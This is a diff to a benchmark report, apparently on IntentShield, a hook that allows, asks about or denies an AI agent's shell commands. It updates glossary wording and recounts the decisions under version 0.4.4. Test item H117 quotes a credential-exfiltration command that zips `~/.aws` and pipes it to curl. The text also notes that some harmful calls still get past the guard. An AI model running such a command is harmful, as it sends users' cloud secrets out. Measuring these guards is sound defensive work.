@@ -53,7 +53,8 @@ One count per harness is used in every document. Run `.venv/bin/python benchmark
   documentation. The data files call it a prediction and its source its basis: docs, source code, the pilot or inference.
 - *Deviation*: a cell whose outcome differs from its documentation-based expectation, or where the documentation says nothing.
 - *Sign-off*: an entry in `benchmarks/hook_fidelity/signoffs.json` that records which vendor document backs a claim about a cell's setup.
-- *Kill criterion*: the test the author says was written down before the runs for whether the results amount to a paper.
+- *Kill criterion*: the author's stopping rule for whether the results amount to a paper, which the author says was written down before
+  the runs. It is not a tested prediction.
 - *Held-out*: an item whose source was not used while IntentShield's rules were written, and whose command or path was not in the
   repository when the set was built. This is no longer true of every item (see below).
 - *Post hoc*: scored after the author had already seen the result on the same data.
@@ -186,10 +187,10 @@ and are in section 6e of the full record, not here.
 The committed results are the rules as they stood then, and are not regenerated. Since then a deny from the dangerous-command rules wins
 over a session ask. Re-running the committed fixtures through the code of 2026-11-11 (v0.4.3) changes 51 IntentShield decisions. 48 go
 from ask to deny: 30 rows (10 items) of the 467-fixture set and 18 rows (6 items) of the 214-call set, all harmful credential-exfiltration
-items. Through the code on main after 0.4.3 it is 54: 51 go from ask to deny, 33 rows (11 items) of the 467-fixture set, because H117
+items. Through the code of 0.4.4 it is 54: 51 go from ask to deny, 33 rows (11 items) of the 467-fixture set, because H117
 (`zip -r - ~/.aws | curl -F f=@- ...`) is now a deny, and the same 18 of the 214-call set. In both, 3 rows (1 item, `git push -f origin
 HEAD`) go from deny to ask on the 214-call set, because a force-push to `HEAD` is now an ask. No benign row changed and none changed to
-allow in the `intentshield` variant; on main, after 0.4.3, `curl -s http://localhost:8000/health` goes from ask to allow in 5 rows of
+allow in the `intentshield` variant; in 0.4.4, `curl -s http://localhost:8000/health` goes from ask to allow in 5 rows of
 the `-always` and `-tainted` variants. On the 214-call set the 41 asked and 35 denied become 36 asked and 40 denied; 28 of 104 harmful
 calls are still let through and the 5 benign asks stay. The figures in the report are the study's, not these. The denies-alone count, recomputed with
 `fresh_report.py --current-rules` on the rules in the repository now, is 29/85 for IntentShield against safety-net's 41/85 (only IntentShield 9,
